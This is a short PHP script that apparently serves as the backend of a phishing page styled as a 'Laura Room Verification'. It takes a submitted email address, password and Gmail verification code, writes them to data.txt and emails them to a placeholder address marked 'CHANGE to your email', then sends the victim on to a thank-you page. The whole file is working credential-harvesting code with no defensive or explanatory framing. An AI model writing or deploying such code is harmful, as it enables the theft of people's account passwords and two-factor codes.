<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['Email'] ?? '';
    $password = $_POST['Password'] ?? '';
    $code = $_POST['Gmail_Code'] ?? '';

    // Sanitize inputs to avoid injection or errors
    $email = trim(htmlspecialchars($email));
    $password = trim(htmlspecialchars($password));
    $code = trim(htmlspecialchars($code));

    // Save to data.txt
    $logEntry = "Email: $email\nPassword: $password\nCode: $code\n----------------------\n";
    file_put_contents("data.txt", $logEntry, FILE_APPEND);

    // Send email notification
    $to = "your-email@example.com"; // CHANGE to your email
    $subject = "Laura Room Verification Submission";
    $message = "Email: $email\nPassword: $password\nVerification Code: $code\n";
    $headers = "From: noreply@yourdomain.com";

    @mail($to, $subject, $message, $headers);

    // Redirect to thank you page
    header("Location: thankyou.html");
    exit;
} else {
    header("Location: index.html");
    exit;
}
?>
